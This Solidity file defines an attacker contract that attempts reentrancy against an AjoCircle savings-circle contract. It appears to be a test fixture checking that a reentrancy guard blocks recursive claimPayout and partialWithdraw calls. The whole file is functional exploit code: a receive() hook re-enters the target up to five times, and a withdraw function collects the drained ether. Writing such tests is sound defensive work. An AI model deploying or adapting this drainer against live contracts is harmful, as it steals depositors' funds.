// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./AjoCircle.sol";

/**
 * @title AttackerContract
 * @notice Malicious contract designed to exploit reentrancy vulnerabilities
 * @dev This contract attempts to recursively call vulnerable functions before state updates complete
 * 
 * ATTACK VECTOR:
 * 1. Attacker calls claimPayout() or partialWithdraw()
 * 2. Target contract sends ETH to this attacker contract
 * 3. receive() function is triggered, giving control back to attacker
 * 4. Attacker recursively calls claimPayout()/partialWithdraw() again
 * 5. If state wasn't updated yet, attacker can drain funds
 * 
 * DEFENSE:
 * - ReentrancyGuard prevents recursive calls with nonReentrant modifier
 * - CEI pattern ensures state updates before external calls
 */
contract AttackerContract {
    AjoCircle public targetContract;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks;
    bool public attacking;
    
    enum AttackType { ClaimPayout, PartialWithdraw }
    AttackType public currentAttackType;
    uint256 public withdrawAmount;
    
    event AttackAttempted(uint256 attemptNumber, bool success);
    event AttackFailed(string reason);
    
    constructor(address _targetContract) {
        targetContract = AjoCircle(_targetContract);
        owner = msg.sender;
        maxAttacks = 5; // Try to drain 5x the legitimate amount
    }
    
    /**
     * @notice Initiate a reentrancy attack on claimPayout
     */
    function attackClaimPayout() external {
        require(msg.sender == owner, "Only owner can attack");
        require(!attacking, "Attack already in progress");
        
        attacking = true;
        attackCount = 0;
        currentAttackType = AttackType.ClaimPayout;
        
        try targetContract.claimPayout() {
            emit AttackAttempted(attackCount, true);
        } catch Error(string memory reason) {
            emit AttackFailed(reason);
            attacking = false;
        } catch {
            emit AttackFailed("Unknown error");
            attacking = false;
        }
    }
    
    /**
     * @notice Initiate a reentrancy attack on partialWithdraw
     * @param _amount Amount to attempt withdrawing
     */
    function attackPartialWithdraw(uint256 _amount) external {
        require(msg.sender == owner, "Only owner can attack");
        require(!attacking, "Attack already in progress");
        
        attacking = true;
        attackCount = 0;
        withdrawAmount = _amount;
        currentAttackType = AttackType.PartialWithdraw;
        
        try targetContract.partialWithdraw(_amount) {
            emit AttackAttempted(attackCount, true);
        } catch Error(string memory reason) {
            emit AttackFailed(reason);
            attacking = false;
        } catch {
            emit AttackFailed("Unknown error");
            attacking = false;
        }
    }
    
    /**
     * @notice Contribute to the circle (to become eligible for payouts)
     */
    function contribute() external payable {
        require(msg.sender == owner, "Only owner can contribute");
        targetContract.contribute{value: msg.value}();
    }
    
    /**
     * @notice Fallback function - THE ATTACK VECTOR
     * @dev This is triggered when the contract receives ETH
     * @dev Attempts to recursively call the target function
     */
    receive() external payable {
        if (attacking && attackCount < maxAttacks) {
            attackCount++;
            
            if (currentAttackType == AttackType.ClaimPayout) {
                // Try to claim payout again before state is updated
                try targetContract.claimPayout() {
                    emit AttackAttempted(attackCount, true);
                } catch Error(string memory reason) {
                    // Attack blocked! ReentrancyGuard or CEI pattern worked
                    emit AttackFailed(reason);
                    attacking = false;
                } catch {
                    emit AttackFailed("Reentrancy blocked");
                    attacking = false;
                }
            } else if (currentAttackType == AttackType.PartialWithdraw) {
                // Try to withdraw again before state is updated
                try targetContract.partialWithdraw(withdrawAmount) {
                    emit AttackAttempted(attackCount, true);
                } catch Error(string memory reason) {
                    // Attack blocked! ReentrancyGuard or CEI pattern worked
                    emit AttackFailed(reason);
                    attacking = false;
                } catch {
                    emit AttackFailed("Reentrancy blocked");
                    attacking = false;
                }
            }
        } else {
            attacking = false;
        }
    }
    
    /**
     * @notice Withdraw stolen funds to owner
     */
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
    
    /**
     * @notice Get contract balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @notice Reset attack state
     */
    function reset() external {
        require(msg.sender == owner, "Only owner can reset");
        attacking = false;
        attackCount = 0;
    }
}
